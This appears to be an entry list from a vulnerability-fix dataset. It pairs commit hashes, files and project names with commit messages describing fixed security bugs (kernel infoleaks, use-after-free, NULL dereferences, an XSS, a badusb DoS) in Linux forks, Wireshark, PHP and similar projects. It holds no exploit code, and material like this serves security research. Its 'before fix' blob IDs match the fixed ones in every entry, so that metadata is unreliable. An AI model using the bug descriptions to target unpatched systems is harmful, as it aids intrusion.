[media] videobuf2-v4l2: Verify planes array in buffer dequeueing\n\nWhen a buffer is being dequeued using VIDIOC_DQBUF IOCTL, the exact buffer which will be dequeued is not known until the buffer has been removed from the queue. The number of planes is specific to a buffer, not to the queue.\n\nThis does lead to the situation where multi-plane buffers may be requested and queued with n planes, but VIDIOC_DQBUF IOCTL may be passed an argument struct with fewer planes.\n\n__fill_v4l2_buffer() however uses the number of planes from the dequeued videobuf2 buffer, overwriting kernel memory (the m.planes array allocated in video_usercopy() in v4l2-ioctl.c)  if the user provided fewer planes than the dequeued buffer had. Oops!\n\nFixes: b0e0e1f83de3 ("[media] media: videobuf2: Prepare to divide videobuf2")\n\nSigned-off-by: Sakari Ailus <sakari.ailus@linux.intel.com> Acked-by: Hans Verkuil <hans.verkuil@cisco.com> Cc: stable@vger.kernel.org # for v4.4 and later Signed-off-by: Mauro Carvalho Chehab <mchehab@osg.samsung.com>

======================================================================
Commit With Fix: 
    cec8f96e49d9be372fdb0c3836dcf31ec71e457e
File(s) In Commit: 
    sound/core/timer.c
Blob(s) In Commit: 
    306a93dea20a913831d7c1291bcce995961a2474
Blob(s) Before Fix: 
    306a93dea20a913831d7c1291bcce995961a2474
Projects:
    0-T-0_ps4-linux
Commit Message for cec8f96e49d9be372fdb0c3836dcf31ec71e457e:
ALSA: timer: Fix leak in SNDRV_TIMER_IOCTL_PARAMS\n\nThe stack object “tread” has a total size of 32 bytes. Its field “event” and “val” both contain 4 bytes padding. These 8 bytes padding bytes are sent to user without being initialized.\n\nSigned-off-by: Kangjie Lu <kjlu@gatech.edu> Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    79e48650320e6fba48369fccf13fd045315b19b8
File(s) In Commit: 
    net/x25/x25_facilities.c
Blob(s) In Commit: 
    997ff7b2509b49a3da6d3183fe65512f8f4caa38
Blob(s) Before Fix: 
    997ff7b2509b49a3da6d3183fe65512f8f4caa38
Projects:
    0-T-0_ps4-linux
Commit Message for 79e48650320e6fba48369fccf13fd045315b19b8:
net: fix a kernel infoleak in x25 module\n\nStack object "dte_facilities" is allocated in x25_rx_call_request(), which is supposed to be initialized in x25_negotiate_facilities. However, 5 fields (8 bytes in total) are not initialized. This object is then copied to userland via copy_to_user, thus infoleak occurs.\n\nSigned-off-by: Kangjie Lu <kjlu@gatech.edu> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    5ec0811d30378ae104f250bfc9b3640242d81e3f
File(s) In Commit: 
    fs/pnode.c
Blob(s) In Commit: 
    99899705b1055411723c3e5919ecbc1f50139e14
Blob(s) Before Fix: 
    99899705b1055411723c3e5919ecbc1f50139e14
Projects:
    0-T-0_ps4-linux
Commit Message for 5ec0811d30378ae104f250bfc9b3640242d81e3f:
propogate_mnt: Handle the first propogated copy being a slave\n\nWhen the first propgated copy was a slave the following oops would result: > BUG: unable to handle kernel NULL pointer dereference at 0000000000000010 > IP: [<ffffffff811fba4e>] propagate_one+0xbe/0x1c0 > PGD bacd4067 PUD bac66067 PMD 0 > Oops: 0000 [#1] SMP > Modules linked in: > CPU: 1 PID: 824 Comm: mount Not tainted 4.6.0-rc5userns+ #1523 > Hardware name: Bochs Bochs, BIOS Bochs 01/01/2007 > task: ffff8800bb0a8000 ti: ffff8800bac3c000 task.ti: ffff8800bac3c000 > RIP: 0010:[<ffffffff811fba4e>]  [<ffffffff811fba4e>] propagate_one+0xbe/0x1c0 > RSP: 0018:ffff8800bac3fd38  EFLAGS: 00010283 > RAX: 0000000000000000 RBX: ffff8800bb77ec00 RCX: 0000000000000010 > RDX: 0000000000000000 RSI: ffff8800bb58c000 RDI: ffff8800bb58c480 > RBP: ffff8800bac3fd48 R08: 0000000000000001 R09: 0000000000000000 > R10: 0000000000001ca1 R11: 0000000000001c9d R12: 0000000000000000 > R13: ffff8800ba713800 R14: ffff8800bac3fda0 R15: ffff8800bb77ec00 > FS:  00007f3c0cd9b7e0(0000) GS:ffff8800bfb00000(0000) knlGS:0000000000000000 > CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033 > CR2: 0000000000000010 CR3: 00000000bb79d000 CR4: 00000000000006e0 > Stack: >  ffff8800bb77ec00 0000000000000000 ffff8800bac3fd88 ffffffff811fbf85 >  ffff8800bac3fd98 ffff8800bb77f080 ffff8800ba713800 ffff8800bb262b40 >  0000000000000000 0000000000000000 ffff8800bac3fdd8 ffffffff811f1da0 > Call Trace: >  [<ffffffff811fbf85>] propagate_mnt+0x105/0x140 >  [<ffffffff811f1da0>] attach_recursive_mnt+0x120/0x1e0 >  [<ffffffff811f1ec3>] graft_tree+0x63/0x70 >  [<ffffffff811f1f6b>] do_add_mount+0x9b/0x100 >  [<ffffffff811f2c1a>] do_mount+0x2aa/0xdf0 >  [<ffffffff8117efbe>] ? strndup_user+0x4e/0x70 >  [<ffffffff811f3a45>] SyS_mount+0x75/0xc0 >  [<ffffffff8100242b>] do_syscall_64+0x4b/0xa0 >  [<ffffffff81988f3c>] entry_SYSCALL64_slow_path+0x25/0x25 > Code: 00 00 75 ec 48 89 0d 02 22 22 01 8b 89 10 01 00 00 48 89 05 fd 21 22 01 39 8e 10 01 00 00 0f 84 e0 00 00 00 48 8b 80 d8 00 00 00 <48> 8b 50 10 48 89 05 df 21 22 01 48 89 15 d0 21 22 01 8b 53 30 > RIP  [<ffffffff811fba4e>] propagate_one+0xbe/0x1c0 >  RSP <ffff8800bac3fd38> > CR2: 0000000000000010 > ---[ end trace 2725ecd95164f217 ]---\n\nThis oops happens with the namespace_sem held and can be triggered by non-root users.  An all around not pleasant experience.\n\nTo avoid this scenario when finding the appropriate source mount to copy stop the walk up the mnt_master chain when the first source mount is encountered.\n\nFurther rewrite the walk up the last_source mnt_master chain so that it is clear what is going on.\n\nThe reason why the first source mount is special is that it it's mnt_parent is not a mount in the dest_mnt propagation tree, and as such termination conditions based up on the dest_mnt mount propgation tree do not make sense.\n\nTo avoid other kinds of confusion last_dest is not changed when computing last_source.  last_dest is only used once in propagate_one and that is above the point of the code being modified, so changing the global variable is meaningless and confusing.\n\nCc: stable@vger.kernel.org fixes: f2ebb3a921c1ca1e2ddd9242e95a1989a50c4c68 ("smarter propagate_mnt()") Reported-by: Tycho Andersen <tycho.andersen@canonical.com> Reviewed-by: Seth Forshee <seth.forshee@canonical.com> Tested-by: Seth Forshee <seth.forshee@canonical.com> Signed-off-by: "Eric W. Biederman" <ebiederm@xmission.com>

======================================================================
Commit With Fix: 
    1f461dcdd296eecedaffffc6bae2bfa90bd7eb89
File(s) In Commit: 
    drivers/net/ppp/ppp_generic.c
Blob(s) In Commit: 
    f572b31a2b20cef55e560b8db932c419f14bd8b3
Blob(s) Before Fix: 
    f572b31a2b20cef55e560b8db932c419f14bd8b3
Projects:
    0-T-0_ps4-linux
Commit Message for 1f461dcdd296eecedaffffc6bae2bfa90bd7eb89:
ppp: take reference on channels netns\n\nLet channels hold a reference on their network namespace. Some channel types, like ppp_async and ppp_synctty, can have their userspace controller running in a different namespace. Therefore they can't rely on them to preclude their netns from being removed from under them.\n\n================================================================== BUG: KASAN: use-after-free in ppp_unregister_channel+0x372/0x3a0 at addr ffff880064e217e0 Read of size 8 by task syz-executor/11581 ============================================================================= BUG net_namespace (Not tainted): kasan: bad access detected -----------------------------------------------------------------------------\n\nDisabling lock debugging due to kernel taint INFO: Allocated in copy_net_ns+0x6b/0x1a0 age=92569 cpu=3 pid=6906 [<      none      >] ___slab_alloc+0x4c7/0x500 kernel/mm/slub.c:2440 [<      none      >] __slab_alloc+0x4c/0x90 kernel/mm/slub.c:2469 [<     inline     >] slab_alloc_node kernel/mm/slub.c:2532 [<     inline     >] slab_alloc kernel/mm/slub.c:2574 [<      none      >] kmem_cache_alloc+0x23a/0x2b0 kernel/mm/slub.c:2579 [<     inline     >] kmem_cache_zalloc kernel/include/linux/slab.h:597 [<     inline     >] net_alloc kernel/net/core/net_namespace.c:325 [<      none      >] copy_net_ns+0x6b/0x1a0 kernel/net/core/net_namespace.c:360 [<      none      >] create_new_namespaces+0x2f6/0x610 kernel/kernel/nsproxy.c:95 [<      none      >] copy_namespaces+0x297/0x320 kernel/kernel/nsproxy.c:150 [<      none      >] copy_process.part.35+0x1bf4/0x5760 kernel/kernel/fork.c:1451 [<     inline     >] copy_process kernel/kernel/fork.c:1274 [<      none      >] _do_fork+0x1bc/0xcb0 kernel/kernel/fork.c:1723 [<     inline     >] SYSC_clone kernel/kernel/fork.c:1832 [<      none      >] SyS_clone+0x37/0x50 kernel/kernel/fork.c:1826 [<      none      >] entry_SYSCALL_64_fastpath+0x16/0x7a kernel/arch/x86/entry/entry_64.S:185\n\nINFO: Freed in net_drop_ns+0x67/0x80 age=575 cpu=2 pid=2631 [<      none      >] __slab_free+0x1fc/0x320 kernel/mm/slub.c:2650 [<     inline     >] slab_free kernel/mm/slub.c:2805 [<      none      >] kmem_cache_free+0x2a0/0x330 kernel/mm/slub.c:2814 [<     inline     >] net_free kernel/net/core/net_namespace.c:341 [<      none      >] net_drop_ns+0x67/0x80 kernel/net/core/net_namespace.c:348 [<      none      >] cleanup_net+0x4e5/0x600 kernel/net/core/net_namespace.c:448 [<      none      >] process_one_work+0x794/0x1440 kernel/kernel/workqueue.c:2036 [<      none      >] worker_thread+0xdb/0xfc0 kernel/kernel/workqueue.c:2170 [<      none      >] kthread+0x23f/0x2d0 kernel/drivers/block/aoe/aoecmd.c:1303 [<      none      >] ret_from_fork+0x3f/0x70 kernel/arch/x86/entry/entry_64.S:468 INFO: Slab 0xffffea0001938800 objects=3 used=0 fp=0xffff880064e20000 flags=0x5fffc0000004080 INFO: Object 0xffff880064e20000 @offset=0 fp=0xffff880064e24200\n\nCPU: 1 PID: 11581 Comm: syz-executor Tainted: G    B           4.4.0+ Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.8.2-0-g33fbe13 by qemu-project.org 04/01/2014  00000000ffffffff ffff8800662c7790 ffffffff8292049d ffff88003e36a300  ffff880064e20000 ffff880064e20000 ffff8800662c77c0 ffffffff816f2054  ffff88003e36a300 ffffea0001938800 ffff880064e20000 0000000000000000 Call Trace:  [<     inline     >] __dump_stack kernel/lib/dump_stack.c:15  [<ffffffff8292049d>] dump_stack+0x6f/0xa2 kernel/lib/dump_stack.c:50  [<ffffffff816f2054>] print_trailer+0xf4/0x150 kernel/mm/slub.c:654  [<ffffffff816f875f>] object_err+0x2f/0x40 kernel/mm/slub.c:661  [<     inline     >] print_address_description kernel/mm/kasan/report.c:138  [<ffffffff816fb0c5>] kasan_report_error+0x215/0x530 kernel/mm/kasan/report.c:236  [<     inline     >] kasan_report kernel/mm/kasan/report.c:259  [<ffffffff816fb4de>] __asan_report_load8_noabort+0x3e/0x40 kernel/mm/kasan/report.c:280  [<     inline     >] ? ppp_pernet kernel/include/linux/compiler.h:218  [<ffffffff83ad71b2>] ? ppp_unregister_channel+0x372/0x3a0 kernel/drivers/net/ppp/ppp_generic.c:2392  [<     inline     >] ppp_pernet kernel/include/linux/compiler.h:218  [<ffffffff83ad71b2>] ppp_unregister_channel+0x372/0x3a0 kernel/drivers/net/ppp/ppp_generic.c:2392  [<     inline     >] ? ppp_pernet kernel/drivers/net/ppp/ppp_generic.c:293  [<ffffffff83ad6f26>] ? ppp_unregister_channel+0xe6/0x3a0 kernel/drivers/net/ppp/ppp_generic.c:2392  [<ffffffff83ae18f3>] ppp_asynctty_close+0xa3/0x130 kernel/drivers/net/ppp/ppp_async.c:241  [<ffffffff83ae1850>] ? async_lcp_peek+0x5b0/0x5b0 kernel/drivers/net/ppp/ppp_async.c:1000  [<ffffffff82c33239>] tty_ldisc_close.isra.1+0x99/0xe0 kernel/drivers/tty/tty_ldisc.c:478  [<ffffffff82c332c0>] tty_ldisc_kill+0x40/0x170 kernel/drivers/tty/tty_ldisc.c:744  [<ffffffff82c34943>] tty_ldisc_release+0x1b3/0x260 kernel/drivers/tty/tty_ldisc.c:772  [<ffffffff82c1ef21>] tty_release+0xac1/0x13e0 kernel/drivers/tty/tty_io.c:1901  [<ffffffff82c1e460>] ? release_tty+0x320/0x320 kernel/drivers/tty/tty_io.c:1688  [<ffffffff8174de36>] __fput+0x236/0x780 kernel/fs/file_table.c:208  [<ffffffff8174e405>] ____fput+0x15/0x20 kernel/fs/file_table.c:244  [<ffffffff813595ab>] task_work_run+0x16b/0x200 kernel/kernel/task_work.c:115  [<     inline     >] exit_task_work kernel/include/linux/task_work.h:21  [<ffffffff81307105>] do_exit+0x8b5/0x2c60 kernel/kernel/exit.c:750  [<ffffffff813fdd20>] ? debug_check_no_locks_freed+0x290/0x290 kernel/kernel/locking/lockdep.c:4123  [<ffffffff81306850>] ? mm_update_next_owner+0x6f0/0x6f0 kernel/kernel/exit.c:357  [<ffffffff813215e6>] ? __dequeue_signal+0x136/0x470 kernel/kernel/signal.c:550  [<ffffffff8132067b>] ? recalc_sigpending_tsk+0x13b/0x180 kernel/kernel/signal.c:145  [<ffffffff81309628>] do_group_exit+0x108/0x330 kernel/kernel/exit.c:880  [<ffffffff8132b9d4>] get_signal+0x5e4/0x14f0 kernel/kernel/signal.c:2307  [<     inline     >] ? kretprobe_table_lock kernel/kernel/kprobes.c:1113  [<ffffffff8151d355>] ? kprobe_flush_task+0xb5/0x450 kernel/kernel/kprobes.c:1158  [<ffffffff8115f7d3>] do_signal+0x83/0x1c90 kernel/arch/x86/kernel/signal.c:712  [<ffffffff8151d2a0>] ? recycle_rp_inst+0x310/0x310 kernel/include/linux/list.h:655  [<ffffffff8115f750>] ? setup_sigcontext+0x780/0x780 kernel/arch/x86/kernel/signal.c:165  [<ffffffff81380864>] ? finish_task_switch+0x424/0x5f0 kernel/kernel/sched/core.c:2692  [<     inline     >] ? finish_lock_switch kernel/kernel/sched/sched.h:1099  [<ffffffff81380560>] ? finish_task_switch+0x120/0x5f0 kernel/kernel/sched/core.c:2678  [<     inline     >] ? context_switch kernel/kernel/sched/core.c:2807  [<ffffffff85d794e9>] ? __schedule+0x919/0x1bd0 kernel/kernel/sched/core.c:3283  [<ffffffff81003901>] exit_to_usermode_loop+0xf1/0x1a0 kernel/arch/x86/entry/common.c:247  [<     inline     >] prepare_exit_to_usermode kernel/arch/x86/entry/common.c:282  [<ffffffff810062ef>] syscall_return_slowpath+0x19f/0x210 kernel/arch/x86/entry/common.c:344  [<ffffffff85d88022>] int_ret_from_sys_call+0x25/0x9f kernel/arch/x86/entry/entry_64.S:281 Memory state around the buggy address:  ffff880064e21680: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb  ffff880064e21700: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb >ffff880064e21780: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb                                                        ^  ffff880064e21800: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb  ffff880064e21880: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb ==================================================================\n\nFixes: 273ec51dd7ce ("net: ppp_generic - introduce net-namespace functionality v2") Reported-by: Baozeng Ding <sploving1@gmail.com> Signed-off-by: Guillaume Nault <g.nault@alphalink.fr> Reviewed-by: Cyrill Gorcunov <gorcunov@openvz.org> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    1c0808d580da09fdec5a9a74ff09e103ea058dd4
File(s) In Commit: 
    lib/http2/connection.c
Blob(s) In Commit: 
    6be9615e11f3572216313b7ea6fc0509bbd594e7
Blob(s) Before Fix: 
    6be9615e11f3572216313b7ea6fc0509bbd594e7
Projects:
    012huang_you-get
Commit Message for 1c0808d580da09fdec5a9a74ff09e103ea058dd4:
h2: use after free on premature connection close #920\n\nlib/http2/connection.c:on_read() calls parse_input(), which might free `conn`. It does so in particular if the connection preface isn't the expected one in expect_preface(). `conn` is then used after the free in `if (h2o_timeout_is_linked(&conn->_write.timeout_entry)`. We fix this by adding a return value to close_connection that returns a negative value if `conn` has been free'd and can't be used anymore.\n\nCredits for finding the bug to Tim Newsham.

======================================================================
Commit With Fix: 
    b4dcbba7a8eb09ba9d38fc69807a8861255736d0
File(s) In Commit: 
    site/search.php
Blob(s) In Commit: 
    87e5c7fc8bae6ee879d6da114472c705ee01ce17
Blob(s) Before Fix: 
    87e5c7fc8bae6ee879d6da114472c705ee01ce17
Projects:
    ajgl_ossec-wui
Commit Message for b4dcbba7a8eb09ba9d38fc69807a8861255736d0:
Unanchored regex would allow badness through.  This patch eliminates a XSS identified by JPCERT Reference number: JVN#58455472

======================================================================
Commit With Fix: 
    99d825822eade8d827a1817357cbf3f889a552d6
File(s) In Commit: 
    fs/isofs/rock.c
Blob(s) In Commit: 
    98b3eb7d8eaf64d5eb006801aeb130ff8503f593
Blob(s) Before Fix: 
    98b3eb7d8eaf64d5eb006801aeb130ff8503f593
Projects:
    0-T-0_ps4-linux
Commit Message for 99d825822eade8d827a1817357cbf3f889a552d6:
get_rock_ridge_filename(): handle malformed NM entries\n\nPayloads of NM entries are not supposed to contain NUL.  When we run into such, only the part prior to the first NUL goes into the concatenation (i.e. the directory entry name being encoded by a bunch of NM entries).  We do stop when the amount collected so far + the claimed amount in the current NM entry exceed 254.  So far, so good, but what we return as the total length is the sum of *claimed* sizes, not the actual amount collected.  And that can grow pretty large - not unlimited, since you'd need to put CE entries in between to be able to get more than the maximum that could be contained in one isofs directory entry / continuation chunk and we are stop once we'd encountered 32 CEs, but you can get about 8Kb easily.  And that's what will be passed to readdir callback as the name length.  8Kb __copy_to_user() from a buffer allocated by __get_free_page()\n\nCc: stable@vger.kernel.org # 0.98pl6+ (yes, really) Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>

======================================================================
Commit With Fix: 
    45e093ae2830cd1264677d47ff9a95a71f5d9f9c
File(s) In Commit: 
    net/tipc/socket.c
Blob(s) In Commit: 
    3b7a79991d55ddb4dc3f6629ac37c7cd6ebf1a87
Blob(s) Before Fix: 
    3b7a79991d55ddb4dc3f6629ac37c7cd6ebf1a87
Projects:
    0-T-0_ps4-linux
Commit Message for 45e093ae2830cd1264677d47ff9a95a71f5d9f9c:
tipc: check nl sock before parsing nested attributes\n\nMake sure the socket for which the user is listing publication exists before parsing the socket netlink attributes.\n\nPrior to this patch a call without any socket caused a NULL pointer dereference in tipc_nl_publ_dump().\n\nTested-and-reported-by: Baozeng Ding <sploving1@gmail.com> Signed-off-by: Richard Alpe <richard.alpe@ericsson.com> Acked-by: Jon Maloy <jon.maloy@ericsson.cm> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    0da8b8b801f9276359262f1ef8274c7812d3dfda
File(s) In Commit: 
    ext/standard/html.c
Blob(s) In Commit: 
    81d8aff9e9adb54c09de2fda1277610b291780cb
Blob(s) Before Fix: 
    81d8aff9e9adb54c09de2fda1277610b291780cb
Projects:
    0014593_php-src
Commit Message for 0da8b8b801f9276359262f1ef8274c7812d3dfda:
Fix bug #72135 - don't create strings with lengths outside int range

======================================================================
Commit With Fix: 
    d2dc9481d2af25b035778c67eaf0bfd2d2c59dd8
File(s) In Commit: 
    libraries/error_report.lib.php
Blob(s) In Commit: 
    856425606f9c15307ec8f9990f355276cdb01a1b
Blob(s) Before Fix: 
    856425606f9c15307ec8f9990f355276cdb01a1b
Projects:
    007durgesh219_phpmyadmin
Commit Message for d2dc9481d2af25b035778c67eaf0bfd2d2c59dd8:
Fix possible path existence disclossure\n\nOn non released versions (where line counts are not precalculated) it was possible to check for file existence due to limited checks for supplied path.\n\nSigned-off-by: Michal Čihař <michal@cihar.com>

======================================================================
Commit With Fix: 
    4dc1a2d7931017d3625f2d7cff70a17ce58b53b4
File(s) In Commit: 
    src/gd_xbm.c
Blob(s) In Commit: 
    d28fdfc564afc709f23d72cddd7bdcb3f525d43c
Blob(s) Before Fix: 
    d28fdfc564afc709f23d72cddd7bdcb3f525d43c
Projects:
    86salo_libgd
Commit Message for 4dc1a2d7931017d3625f2d7cff70a17ce58b53b4:
xbm: avoid stack overflow (read) with large names #211\n\nWe use the name passed in to printf into a local stack buffer which is limited to 4000 bytes.  So given a large enough value, lots of stack data is leaked.  Rewrite the code to do simple memory copies with most of the strings to avoid that issue, and only use stack buffer for small numbers of constant size.\n\nThis closes #211.

======================================================================
Commit With Fix: 
    5d2be1422e02ccd697ccfcd45c85b4a26e6178e2
File(s) In Commit: 
    net/tipc/netlink_compat.c
Blob(s) In Commit: 
    3ad9fab1985f1cdca35c876f0f228d28b9b5db00
Blob(s) Before Fix: 
    3ad9fab1985f1cdca35c876f0f228d28b9b5db00
Projects:
    0-T-0_ps4-linux
Commit Message for 5d2be1422e02ccd697ccfcd45c85b4a26e6178e2:
tipc: fix an infoleak in tipc_nl_compat_link_dump\n\nlink_info.str is a char array of size 60. Memory after the NULL byte is not initialized. Sending the whole object out can cause a leak.\n\nSigned-off-by: Kangjie Lu <kjlu@gatech.edu> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    4116def2337991b39919f3b448326e21c40e0dbb
File(s) In Commit: 
    net/rds/recv.c
Blob(s) In Commit: 
    8413f6c99e13519d7cbfa1ec6ce3877a0059caa7
Blob(s) Before Fix: 
    8413f6c99e13519d7cbfa1ec6ce3877a0059caa7
Projects:
    0-T-0_ps4-linux
Commit Message for 4116def2337991b39919f3b448326e21c40e0dbb:
rds: fix an infoleak in rds_inc_info_copy\n\nThe last field "flags" of object "minfo" is not initialized. Copying this object out may leak kernel stack data. Assign 0 to it to avoid leak.\n\nSigned-off-by: Kangjie Lu <kjlu@gatech.edu> Acked-by: Santosh Shilimkar <santosh.shilimkar@oracle.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    b4d16b4495b732888e12baf5b8a7e9bf2665e22b
File(s) In Commit: 
    epan/dissectors/packet-dcerpc-spoolss.c
Blob(s) In Commit: 
    22eef3c5ad992305b60a49821c5a998b950361c1
Blob(s) Before Fix: 
    22eef3c5ad992305b60a49821c5a998b950361c1
Projects:
    280455936_wireshark
Commit Message for b4d16b4495b732888e12baf5b8a7e9bf2665e22b:
SPOOLSS: Try to avoid an infinite loop.\n\nUse tvb_reported_length_remaining in dissect_spoolss_uint16uni. Make sure our offset always increments in dissect_spoolss_keybuffer.\n\nChange-Id: I7017c9685bb2fa27161d80a03b8fca4ef630e793 Reviewed-on: https://code.wireshark.org/review/14687 Reviewed-by: Gerald Combs <gerald@wireshark.org> Petri-Dish: Gerald Combs <gerald@wireshark.org> Tested-by: Petri Dish Buildbot <buildbot-no-reply@wireshark.org> Reviewed-by: Michael Mann <mmann78@netscape.net>

======================================================================
Commit With Fix: 
    9b0b20b8d5f8c9f7839d58ff6c5900f7e19283b4
File(s) In Commit: 
    epan/crypt/airpdcap.c
Blob(s) In Commit: 
    1212cdde7c6f02a1514cde6fbdafa2b9505e2415
Blob(s) Before Fix: 
    1212cdde7c6f02a1514cde6fbdafa2b9505e2415
Projects:
    280455936_wireshark
Commit Message for 9b0b20b8d5f8c9f7839d58ff6c5900f7e19283b4:
Make sure EAPOL body is big enough for a EAPOL_RSN_KEY.\n\nA pointer to a EAPOL_RSN_KEY is set on the packet presuming the whole EAPOL_RSN_KEY is there.  That's not always the case for fuzzed/malicious captures.\n\nBug: 11585 Change-Id: Ib94b8aceef444c7820e43b969596efdb8dbecccd Reviewed-on: https://code.wireshark.org/review/15540 Reviewed-by: Michael Mann <mmann78@netscape.net> Petri-Dish: Michael Mann <mmann78@netscape.net> Tested-by: Petri Dish Buildbot <buildbot-no-reply@wireshark.org> Reviewed-by: Anders Broman <a.broman58@gmail.com>

======================================================================
Commit With Fix: 
    b6d838eebf4456192360654092e5587c5207f185
File(s) In Commit: 
    epan/crypt/airpdcap.c
Blob(s) In Commit: 
    dd948a0d1d67ca3172748cd14866c1caec653097
Blob(s) Before Fix: 
    dd948a0d1d67ca3172748cd14866c1caec653097
Projects:
    280455936_wireshark
Commit Message for b6d838eebf4456192360654092e5587c5207f185:
Sanity check eapol_len in AirPDcapDecryptWPABroadcastKey\n\nBug: 12175 Change-Id: Iaf977ba48f8668bf8095800a115ff9a3472dd893 Reviewed-on: https://code.wireshark.org/review/15326 Petri-Dish: Michael Mann <mmann78@netscape.net> Tested-by: Petri Dish Buildbot <buildbot-no-reply@wireshark.org> Reviewed-by: Alexis La Goutte <alexis.lagoutte@gmail.com> Reviewed-by: Peter Wu <peter@lekensteyn.nl> Tested-by: Peter Wu <peter@lekensteyn.nl>

======================================================================
Commit With Fix: 
    7d7190695ce2ff269fdffb04e87139995cde21f4
File(s) In Commit: 
    epan/dissectors/packet-umts_fp.c
Blob(s) In Commit: 
    5552e0cceedd0074d023ff1890332f6c3cde0b34
Blob(s) Before Fix: 
    5552e0cceedd0074d023ff1890332f6c3cde0b34
Projects:
    280455936_wireshark
Commit Message for 7d7190695ce2ff269fdffb04e87139995cde21f4:
UMTS_FP: fix handling reserved C/T value\n\nThe spec puts the reserved value at 0xf but our internal table has 'unknown' at 0  since all the other values seem to be offset-by-one, just take the modulus 0xf to avoid running off the end of the table.\n\nBug: 12191 Change-Id: I83c8fb66797bbdee52a2246fb1eea6e37cbc7eb0 Reviewed-on: https://code.wireshark.org/review/15722 Reviewed-by: Evan Huus <eapache@gmail.com> Petri-Dish: Evan Huus <eapache@gmail.com> Tested-by: Petri Dish Buildbot <buildbot-no-reply@wireshark.org> Reviewed-by: Michael Mann <mmann78@netscape.net>

======================================================================
Commit With Fix: 
    b8e0d416898bb975a02c1b55883342edc5b4c9c0
File(s) In Commit: 
    epan/dissectors/packet-wbxml.c
Blob(s) In Commit: 
    ae5425a4d96fdb151a1221da7fa12c8ca42d6de8
Blob(s) Before Fix: 
    ae5425a4d96fdb151a1221da7fa12c8ca42d6de8
Projects:
    280455936_wireshark
Commit Message for b8e0d416898bb975a02c1b55883342edc5b4c9c0:
WBXML: add a basic sanity check for offset overflow\n\nThis is a naive approach allowing to detact that something went wrong, without the need to replace all proto_tree_add_text() calls as what was done in master-2.0 branch.\n\nBug: 12408 Change-Id: Ia14905005e17ae322c2fc639ad5e491fa08b0108 Reviewed-on: https://code.wireshark.org/review/15310 Reviewed-by: Michael Mann <mmann78@netscape.net> Reviewed-by: Pascal Quantin <pascal.quantin@gmail.com>

======================================================================
Commit With Fix: 
    152d6d95632d8b9477c170f1de99bcd86d7fb1d6
File(s) In Commit: 
    programs/pluto/ikev1.c
Blob(s) In Commit: 
    8bc61837ac09399c39912264d652121f87674730
Blob(s) Before Fix: 
    8bc61837ac09399c39912264d652121f87674730
Projects:
    123kayi_libreswan
Commit Message for 152d6d95632d8b9477c170f1de99bcd86d7fb1d6:
IKEv1: packet retransmit fixes for Main/Aggr/Xauth modes\n\n- Do not schedule retransmits for inI1outR1 packets (prevent DDOS) - Do schedule retransmits for XAUTH packets

======================================================================
Commit With Fix: 
    aa93d1fee85c890a34f2510a310e55ee76a27848
File(s) In Commit: 
    drivers/media/usb/airspy/airspy.c
Blob(s) In Commit: 
    92d9d4214c3adb326dc1a23d0c2c43840172611c
Blob(s) Before Fix: 
    92d9d4214c3adb326dc1a23d0c2c43840172611c
Projects:
    0-T-0_ps4-linux
Commit Message for aa93d1fee85c890a34f2510a310e55ee76a27848:
media: fix airspy usb probe error path\n\nFix a memory leak on probe error of the airspy usb device driver.\n\nThe problem is triggered when more than 64 usb devices register with v4l2 of type VFL_TYPE_SDR or VFL_TYPE_SUBDEV.\n\nThe memory leak is caused by the probe function of the airspy driver mishandeling errors and not freeing the corresponding control structures when an error occours registering the device to v4l2 core.\n\nA badusb device can emulate 64 of these devices, and then through continual emulated connect/disconnect of the 65th device, cause the kernel to run out of RAM and crash the kernel, thus causing a local DOS vulnerability.\n\nFixes CVE-2016-5400\n\nSigned-off-by: James Patrick-Evans <james@jmp-e.com> Reviewed-by: Kees Cook <keescook@chromium.org> Cc: stable@vger.kernel.org # 3.17+ Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    dfd6b54ce33960e420fb206d8872fb759b577ad9
File(s) In Commit: 
    libarchive/archive_write_disk_posix.c
Blob(s) In Commit: 
    abe1a86d2885cabc99354d3ddf7c105873b94301
Blob(s) Before Fix: 
    abe1a86d2885cabc99354d3ddf7c105873b94301
Projects:
    AasemShokr_libarchive
Commit Message for dfd6b54ce33960e420fb206d8872fb759b577ad9:
Fixes for Issue #745 and Issue #746 from Doran Moppert.

======================================================================
Commit With Fix: 
    f03b986b4439e20b0fd635109b48afe96cf0099b
File(s) In Commit: 
    src/JOSE/JWE.php
Blob(s) In Commit: 
    964d8ce75f695dfc70c536cd9049f4064b6629ec
Blob(s) Before Fix: 
    964d8ce75f695dfc70c536cd9049f4064b6629ec
Projects:
    30mw002_jose-1
Commit Message for f03b986b4439e20b0fd635109b48afe96cf0099b:
one more hash_equals, and better CEK decryption error handling

======================================================================
Commit With Fix: 
    1cce55e27adf0274193eb1cd74b927a398a3df4b
File(s) In Commit: 
    src/JOSE/JWS.php
Blob(s) In Commit: 
    60c1cbb3a73e008df4918f2ee5bac3929dda5e6c
Blob(s) Before Fix: 
    60c1cbb3a73e008df4918f2ee5bac3929dda5e6c
Projects:
    30mw002_jose-1
Commit Message for 1cce55e27adf0274193eb1cd74b927a398a3df4b:
explicit alg check & secure hash comparison

======================================================================
Commit With Fix: 
    75ff39ccc1bd5d3c455b6822ab09e533c551f758
File(s) In Commit: 
    net/ipv4/tcp_input.c
Blob(s) In Commit: 
    91868bb1781864cdf316ca5efc6be1d70d967407
Blob(s) Before Fix: 
    91868bb1781864cdf316ca5efc6be1d70d967407
Projects:
    0-T-0_ps4-linux
Commit Message for 75ff39ccc1bd5d3c455b6822ab09e533c551f758:
